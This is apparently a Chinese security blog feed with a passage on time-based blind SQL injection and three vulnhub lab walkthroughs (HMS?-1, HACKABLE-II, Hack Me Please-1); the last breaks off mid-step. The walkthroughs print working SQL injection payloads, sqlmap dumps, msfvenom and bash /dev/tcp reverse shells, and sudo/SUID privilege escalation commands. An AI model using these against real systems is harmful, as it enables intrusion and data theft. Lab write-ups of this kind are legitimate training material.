alt="Untitled"></p><p><strong>那么，关于or呢？</strong></p><p>我们都知道or是两边任一为真时，整体的结果为真</p><p><strong>那么当第一个结果为真，还会继续执行并判断第二个条件么？</strong></p><p>我们继续在数据库中实验</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">true</span> or <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure><p><strong>结果：并未挂起，说明在or中当第一个条件为真时不会对第二个条件进行执行和判断</strong></p><p><img src="Untitled%20110.png" alt="Untitled"></p><p><strong>我们可以构造一条第一个条件为假时执行并判断第二个条件的sql语句来验证这个结论</strong></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">false</span> or <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure><p><strong>结果：挂起将近三秒，说明在or中若第一个条件为假，则会接着判断第二个条件</strong></p><p><img src="Untitled%20111.png" alt="Untitled"></p><p>那么，<strong>还记得我们最初的问题么？为什么使用and不用or？</strong></p><p>我们试着将一开始的语句换成or试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM <span class="built_in">users</span> WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span> or <span class="built_in">sleep</span>(3)</span><br></pre></td></tr></table></figure><p><strong>结果：挂起将近一分钟</strong></p><p><img src="Untitled%20112.png" alt="Untitled"></p><p>那么为什么会挂起一分钟呢？</p><p>我们分析一下，当查询语句每查到一条数据的时候，按照or的判断规则</p><p>都会先判断第一个条件即</p><p><strong>判断id是否等于1，若不等于就会睡眠3秒，只有当id等于1的时候才不会挂起</strong></p><p><strong>因此当数据库条目很多的时候，则会造成挂起很久的情况。</strong></p><p>因此不建议使用or</p><h3 id="爆破数据库名-7"><a href="#爆破数据库名-7" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and if(ascii(substring((select database()),1,1))&gt;10,sleep(3),0)--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：判断出数据库的第一个字符为s，睡眠三秒，后面将使用sqlmap进行演示</strong></p><p><img src="Untitled%20113.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 </span><br></pre></td></tr></table></figure><p><strong>结果：发现时间型盲注</strong></p><p><img src="Untitled%20114.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 --current-db </span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名security</strong></p><p><img src="Untitled%20115.png" alt="Untitled"></p><h3 id="爆破表名-6"><a href="#爆破表名-6" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 -D security --tables</span><br></pre></td></tr></table></figure><p><strong>结果：得到表名</strong></p><p><img src="Untitled%20116.png" alt="Untitled"></p><h3 id="爆破字段名-6"><a href="#爆破字段名-6" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 -D security -T <span class="built_in">users</span> --columns</span><br></pre></td></tr></table></figure><p><strong>结果：得到字段名</strong></p><p><img src="Untitled%20117.png" alt="Untitled"></p><h3 id="爆破数据-6"><a href="#爆破数据-6" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-9/?<span class="built_in">id</span>=1 --threads 10 -D security --dump</span><br></pre></td></tr></table></figure><p><strong>结果：得到数据，第九关结束</strong></p><p><img src="Untitled%20118.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』HMS?-1</title>
      <link href="/2024/07/01/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHMS-1/"/>
      <url>/2024/07/01/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHMS-1/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』HMS-1"><a href="#『vulnhub系列』HMS-1" class="headerlink" title="『vulnhub系列』HMS?-1"></a>『vulnhub系列』HMS?-1</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/hms-<span class="number">1</span>,<span class="number">728</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>使用nmap进行存活主机探测，发现开启了21端口（ftp）和22端口（ssh）</p><p><img src="Untitled.png" alt="Untitled"></p><p>匿名登录ftp看看里面有什么东西，发现什么都没有</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp <span class="number">192.168</span><span class="number">.199</span><span class="number">.133</span></span><br><span class="line"><span class="comment">#使用anonymous登录，无需输入密码</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%201.png" alt="Untitled"></p><p>进行全面扫描，发现开启了7080端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.199</span><span class="number">.133</span> -p <span class="number">1</span>-<span class="number">65535</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问7080端口的服务发现存在一个登录页面</p><p><img src="Untitled%203.png" alt="Untitled"></p><p>使用dirsearch进行目录扫描</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.199.133:7080/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%204.png" alt="Untitled"></p><p>在登录页面查看是否存在sql注入，发现确实存在，一个报错注入一个盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmsqlmap -u http://<span class="number">192.168</span><span class="number">.199</span><span class="number">.133</span>:<span class="number">7080</span>/login.php --data=<span class="string">&quot;user=admin&amp;email=admin%40123&amp;password=asd&amp;btn_login=&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p>查看数据库</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.199</span><span class="number">.133</span>:<span class="number">7080</span>/login.php --data=<span class="string">&quot;user=admin&amp;email=admin%40123&amp;password=asd&amp;btn_login=&quot;</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="Untitled%206.png" alt="Untitled"></p><p>查看数据库中的表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.199</span><span class="number">.133</span>:<span class="number">7080</span>/login.php --data=<span class="string">&quot;user=admin&amp;email=admin%40123&amp;password=asd&amp;btn_login=&quot;</span> -D <span class="string">&#x27;clinic_db&#x27;</span> --tables</span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>查看admin表中的字段，发现邮箱为 <a href="mailto:ndbhalerao91@gmail.com"><code>ndbhalerao91@gmail.com</code></a> ，但是我们发现密码并不是明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://<span class="number">192.168</span><span class="number">.199</span><span class="number">.133</span>:<span class="number">7080</span>/login.php --data=<span class="string">&quot;user=admin&amp;email=admin%40123&amp;password=asd&amp;btn_login=&quot;</span> -D <span class="string">&#x27;clinic_db&#x27;</span> -T <span class="string">&#x27;admin&#x27;</span> --dump</span><br></pre></td></tr></table></figure><p><img src="Untitled%208.png" alt="Untitled"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>我们之前发现，是存在报错注入的并且看payload是通过单引号闭合的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload: user=admin&amp;email=admin@<span class="number">123</span><span class="string">&#x27; OR (SELECT 9709 FROM(SELECT COUNT(*),CONCAT(0x7170707671,(SELECT (ELT(9709=9709,1))),0x716b706b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nnPx&amp;password=asd&amp;btn_login=</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%209.png" alt="Untitled"></p><p>我们使用万能密码发现带有前端验证</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>我们使用burp抓包，使用<code>Repeater</code>确认一下，发现<code>Login Successfully</code> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin&amp;email=ndbhalerao91%40gmail.com<span class="string">&#x27; or 1=1 #&amp;password=asd&amp;btn_login=</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2011.png" alt="Untitled"></p><p>我们放包，登录成功</p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>找了半天，没有发现什么地方可疑，我们再使用另一个工具扫描一下目录，因为并没有登录，所以这些302的跳转页面，其实也是存在的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u <span class="string">&quot;http://192.168.199.133:7080/&quot;</span> -w /usr/share/wordlists/dirb/big.txt -x .php</span><br></pre></td></tr></table></figure><p><img src="Untitled%2013.png" alt="Untitled"></p><p>我们发现了setting页面，存在文件上传页面。上传使用<code>msfvenom</code> 生成的反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span> lport=<span class="number">4444</span> -o re_shell.php</span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><p>然后发现上面出现了一串图片</p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>新标签页访问，发现新的目录<code>/uploadImage</code></p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>最后在<code>/uploadImage/Logo/</code> 中发现我们的<code>re_shell.php</code> </p><p><img src="Untitled%2017.png" alt="Untitled"></p><p>此时在我们的攻击机开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.199</span><span class="number">.133</span></span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="Untitled%2018.png" alt="Untitled"></p><p>反弹成功</p><p><img src="Untitled%2019.png" alt="Untitled"></p><h2 id="提升权限："><a href="#提升权限：" class="headerlink" title="提升权限："></a>提升权限：</h2><p>查看具有SUID权限的命令，发现/usr/bin/bash我们可以借此切换用户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="Untitled%2020.png" alt="Untitled"></p><p>使用命令,成功切换为<code>eren</code> 用户</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/<span class="built_in">bin</span>/bash -p</span><br></pre></td></tr></table></figure><p><img src="Untitled%2021.png" alt="Untitled"></p><p>但是使用命令<code>sudo -l</code>发现还是要输入密码，因此此时我们的eren用户的权限并不完整</p><p>我们查看计划任务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure><p><img src="Untitled%2022.png" alt="Untitled"></p><p>发现一条计划任务<code>*/5 * * * * eren /home/eren/backup.sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">关于计划任务：</span><br><span class="line">*  *  *  *  *</span><br><span class="line">分 时 日 月 周</span><br><span class="line">而对于这条命令意思就是每五分钟执行一次</span><br><span class="line">*/<span class="number">5</span> * * * * eren /home/eren//backup.sh</span><br></pre></td></tr></table></figure><p>可以看到这个文件正好早eren的家目录下。那么我们刚刚切换为eren用户的操作就可以用到了，使用eren权限我们将反弹shell写入<code>/backup.sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.199.129/7777 0&gt;&amp;1&quot;</span> &gt;&gt; /home/eren/backup.sh</span><br></pre></td></tr></table></figure><p>之后在攻击机使用nc等待</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">7777</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2023.png" alt="Untitled"></p><p>连接成功，获得完整的eren用户权限</p><p>使用命令<code>sudo -l</code> 查看用户可以在机器上运行的命令，发现tar命令可以以root权限执行</p><p>现在我们使用tar的sudo提权</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -cf /dev/null /dev/null --checkpoint=<span class="number">1</span> --checkpoint-action=<span class="built_in">exec</span>=/<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure><ul><li>-cf /dev/null /dev/null  将/dev/null 打包为 /dev/null</li><li>-c 打包</li><li>-f 打包为f后面的名字</li><li>—checkpoint=1 每打包一个文件就到达一个检查点</li><li>—checkpoint-action=exec=/bin/sh 到达检查点后执行的命令</li></ul><p>获得root权限</p><p><img src="Untitled%2024.png" alt="Untitled"></p><h2 id="成果："><a href="#成果：" class="headerlink" title="成果："></a>成果：</h2><p><code>/home/nivek/local.txt</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3bbf8c168408f1d5ff9dfd91fc00d0c1</span><br></pre></td></tr></table></figure><p><code>/root/root.txt</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">299c10117c1940f21b70a391ca125c5d</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』HACKABLE-II</title>
      <link href="/2024/06/06/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHACKABLE-II/"/>
      <url>/2024/06/06/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHACKABLE-II/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』HACKABLE-II"><a href="#『vulnhub系列』HACKABLE-II" class="headerlink" title="『vulnhub系列』HACKABLE-II"></a>『vulnhub系列』HACKABLE-II</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/hackable-ii,711/</span><br></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>使用nmap探测存活主机，发现主机开启了21,22和80端口</p><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口的web服务，发现apache默认页面</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch进行目录爆破，发现<code>files</code> 目录</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.199.135/&quot;</span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>访问<code>files</code> 页面发现<code>CALL.html</code></p><p><img src="Untitled%203.png" alt="Untitled"></p><p>访问<code>CALL.html</code>发现只有一段话</p><p><img src="Untitled%204.png" alt="Untitled"></p><p>这条路的线索暂时断了，我们使用匿名登录ftp，发现<code>CALL.html</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.199.135</span><br><span class="line"><span class="comment">#使用anonymous登录，密码为空</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p><code>get</code>之后发现就是我们刚刚在files中发现的<code>CALL.html</code></p><p><img src="Untitled%206.png" alt="Untitled"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>此时我们上传反弹shell（使用msfvenom生成）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.199.129 lport=4444 -o re_shell.php</span><br><span class="line"><span class="comment">#生成反弹shell</span></span><br><span class="line">put re_shell.php</span><br><span class="line"><span class="comment">#上传反弹shell</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>进入<code>files</code>文件，发现我们刚刚上传的<code>re_shell.php</code></p><p><img src="Untitled%208.png" alt="Untitled"></p><p>我们使用msfconsole进行监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.199.129</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="Untitled%209.png" alt="Untitled"></p><p>开启监听后，访问<code>re_shell.php</code> ，反弹成功</p><p><img src="Untitled%2010.png" alt="Untitled"></p><p>进入shell，使用python开启交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><h2 id="提升权限："><a href="#提升权限：" class="headerlink" title="提升权限："></a>提升权限：</h2><p>我们在<code>/home</code>中发现了<code>important.txt</code> ，读取发现“运行脚本发现数据”</p><p><img src="Untitled%2011.png" alt="Untitled"></p><p>读取<code>/.runme.sh</code> 发现<code>secret key</code> trolled 还有下面的<code>shrek:cf4c2232354952690368f1b3dfdfb24d</code></p><p><img src="Untitled%2012.png" alt="Untitled"></p><p>使用md5解密得到密码<code>onion</code> </p><p><img src="Untitled%2013.png" alt="Untitled"></p><p>切换<code>sherk</code>，使用密码<code>onion</code>，登陆成功</p><p><img src="Untitled%2014.png" alt="Untitled"></p><p>获得<code>user.txt</code> </p><p><img src="Untitled%2015.png" alt="Untitled"></p><p>使用<code>sudo -l</code> 查看当前用户可以以<code>root</code>权限执行的命令，发现<code>python</code>命令可以以<code>root</code>权限提权</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>此时我们使用<code>python</code> 进行提权,成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3.5 -c <span class="string">&#x27;import os;os.system(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><p>得到root.txt</p><p><img src="Untitled%2018.png" alt="Untitled"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 『vulnhub系列』 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『vulnhub系列』Hack Me Please-1</title>
      <link href="/2024/05/31/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHack%20Me%20Please-1/"/>
      <url>/2024/05/31/%E3%80%8Evulnhub%E7%B3%BB%E5%88%97%E3%80%8FHack%20Me%20Please-1/</url>
      
        <content type="html"><![CDATA[<h1 id="『vulnhub系列』Hack-Me-Please-1"><a href="#『vulnhub系列』Hack-Me-Please-1" class="headerlink" title="『vulnhub系列』Hack Me Please-1"></a>『vulnhub系列』Hack Me Please-1</h1><h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/hack-me-please-<span class="number">1</span>,<span class="number">731</span>/</span><br></pre></td></tr></table></figure><h2 id="信息搜集："><a href="#信息搜集：" class="headerlink" title="信息搜集："></a>信息搜集：</h2><p>使用nmap进行探测存活主机，发现主机开启了80端口和3306端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="number">192.168</span><span class="number">.0</span>.*</span><br></pre></td></tr></table></figure><p><img src="Untitled.png" alt="Untitled"></p><p>访问80端口的web服务</p><p><img src="Untitled%201.png" alt="Untitled"></p><p>使用dirsearch扫描目录，但是并没有可以访问的页面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.132/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%202.png" alt="Untitled"></p><p>在main.js发现提示，有一个目录<code>/seeddms51x/seeddms-5.1.22/</code></p><p><img src="Untitled%203.png" alt="Untitled"></p><p>访问一下是一个登录页面</p><p><img src="Untitled%204.png" alt="Untitled"></p><p>现在我们扫描这个目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.132/seeddms51x/seeddms-5.1.22/&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%205.png" alt="Untitled"></p><p>访问<code>/install</code>页面</p><p><img src="Untitled%206.png" alt="Untitled"></p><p>发现install不了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.0</span><span class="number">.132</span>/seeddms51x/seeddms-<span class="number">5.1</span><span class="number">.22</span>/install/install.php</span><br></pre></td></tr></table></figure><p><img src="Untitled%207.png" alt="Untitled"></p><p>说是要在<code>conf</code>目录下创建<code>ENABLE_INSTALL_TOOL</code> ，但是我们好像并不知道这个<code>conf</code>目录在哪里</p><p>可以确定当前<code>seeddms51x/seeddms-5.1.22/</code> 目录下没有。现在我们向前每一级文件都爆破一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.132/seeddms51x/&quot;</span></span><br></pre></td></tr></table></figure><p>我们现在几乎可以确定<code>conf</code>就在<code>/seeddms51x/</code>这个目录文件下了</p><p><img src="Untitled%208.png" alt="Untitled"></p><p>然后我们继续访问<code>conf/ENABLE_INSTALL_TOOL</code>和<code>conf</code>，发现都无法访问</p><p><img src="Untitled%209.png" alt="Untitled"></p><p>继续爆破一下吧，终于发现了<code>settings.xml</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.0.132/seeddms51x/conf&quot;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2010.png" alt="Untitled"></p><p>访问一下，我们找到了数据库的用户名和密码都为：<code>seeddms</code></p><p><img src="Untitled%2011.png" alt="Untitled"></p><p>我们登录mysql</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h <span class="number">192.168</span><span class="number">.0</span><span class="number">.132</span> -u seeddms -p</span><br></pre></td></tr></table></figure><p><img src="Untitled%2012.png" alt="Untitled"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show database; <span class="comment">#查看数据库</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2013.png" alt="Untitled"></p><p>发现users表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use seeddms; <span class="comment">#使用seeddms数据库</span></span><br><span class="line">show tables; <span class="comment">#查看表</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2014.png" alt="Untitled"></p><p>查看users表的内容发现用户名和密码</p><p><code>+-------------+---------------------+--------------------+-----------------+| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |+-------------+---------------------+--------------------+-----------------+|           1 | saket               | saurav             | Saket@#$1337    |+-------------+---------------------+--------------------+-----------------+</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users; <span class="comment">#查看users所有内容</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2015.png" alt="Untitled"></p><p>使用ID和密码登录</p><p><img src="Untitled%2016.png" alt="Untitled"></p><p>登录失败，还有个表是tblUsers，我们查看一下，里面有一个admin和一个md5加密的密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> tblUsers;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2017.png" alt="Untitled"></p><p>我们可以覆盖一下，首先使用python生成一个md5值<code>21232f297a57a5a743894a0e4a801fc3</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import hashlib;print(hashlib.md5(&quot;admin&quot;.encode()).hexdigest())&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="Untitled%2018.png" alt="Untitled"></p><p>修改数据库条目，修改成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update tblUsers <span class="built_in">set</span> pwd=<span class="string">&#x27;21232f297a57a5a743894a0e4a801fc3&#x27;</span> where login=<span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2019.png" alt="Untitled"></p><p>使用我们修改后的密码admin和用户名admin登录，登陆成功</p><p><img src="Untitled%2020.png" alt="Untitled"></p><h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>我们发现添加文件选项是可以上传文件的，我们上传一个msfvenom生成的反弹shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=<span class="number">192.168</span><span class="number">.0</span><span class="number">.129</span> lport=<span class="number">4444</span> -o re_shell.php</span><br></pre></td></tr></table></figure><p><img src="Untitled%2021.png" alt="Untitled"></p><p>我们此时搜一下seeddms的漏洞</p><p><img src="Untitled%2022.png" alt="Untitled"></p><p>看到一个远程命令执行，看一下如何实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Step <span class="number">1</span>: Login to the application <span class="keyword">and</span> under <span class="built_in">any</span> folder add a document.</span><br><span class="line">Step <span class="number">2</span>: Choose the document <span class="keyword">as</span> a simple php backdoor file <span class="keyword">or</span> <span class="built_in">any</span> backdoor/webshell could be used.</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">Step <span class="number">3</span>: Now after uploading the file check the document <span class="built_in">id</span> corresponding to the document.</span><br><span class="line">Step <span 